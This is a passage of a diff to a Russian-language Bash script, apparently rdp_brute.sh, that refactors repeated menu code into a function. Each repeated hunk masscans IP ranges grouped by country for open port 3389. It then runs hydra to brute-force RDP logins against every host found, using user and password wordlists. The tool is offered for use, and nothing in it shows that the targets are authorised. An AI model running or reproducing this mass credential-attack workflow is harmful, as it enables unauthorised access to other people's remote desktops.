-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9083,6 +3711,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9092,53 +3721,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9156,6 +3739,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9165,53 +3749,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9229,6 +3767,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9238,53 +3777,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9302,6 +3795,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9311,53 +3805,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9375,6 +3823,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9384,53 +3833,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9448,6 +3851,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9457,53 +3861,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 else
 if [ "$country" = "126" ]; then
@@ -9520,6 +3878,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9529,53 +3888,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9593,6 +3906,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9602,53 +3916,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9666,6 +3934,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9675,53 +3944,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9739,6 +3962,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9748,53 +3972,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9812,6 +3990,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9821,53 +4000,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9885,6 +4018,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9894,53 +4028,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
@@ -9958,6 +4046,7 @@ echo ""
 echo "Для выхода из режима сканирования 'CTRL+C'"
 echo ""
 masscan -p3389 -iL list --open-only | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" > open3389
+CHECKFILE
 
 echo "Хосты с открытым 3389 портом записаны в файл $PWD/open3389"
 
@@ -9967,53 +4056,7 @@ if [ -e hydra.restore ]; then
 rm -f hydra.restore 2> /dev/null
 fi
 
-echo ""
-echo "         Выбрать метод перебора.."
-echo "1. Ввести 1 логин и указать путь к файлу с паролями: "; 
-echo "2. Указать путь к файлу с логинами и ввести 1 пароль: ";
-echo "3. Указать путь к файлам с логинами и паролями: ";
-echo "4. Приступить к перебору методом по умолчанию: ";
-read -p "   Выбор из меню : " brutmenu
-
-if [ "$brutmenu" = "1" ]; then
-read -p "Введите логин {administrator, admin & etc.} : " loginbrute
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -l $loginbrute -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "2" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Введите пароль {administrator, admin, 123456 & etc.} : " passbrute
-hydra -L $loginlist -p $passbrute -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "3" ]; then
-read -p "Укажите путь к файлу со списком логинов {'/home/dictionary/users'}: " loginlist
-read -p "Укажите путь к файлу со списком паролей {'/home/dictionary/pass'}: " passlist
-hydra -L $loginlist -P $passlist -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
-if [ "$brutmenu" = "4" ]; then
-echo ""
-hydra -L $PWD/users -P $PWD/dictionary/pass -t 4 -W 3 -M $PWD/open3389 rdp
-read -p " Нажмите enter для перехода в Главное меню "
-
-./rdp_brute.sh
-fi
-
-
+MAINBRUTEMENURU
 
 
 else
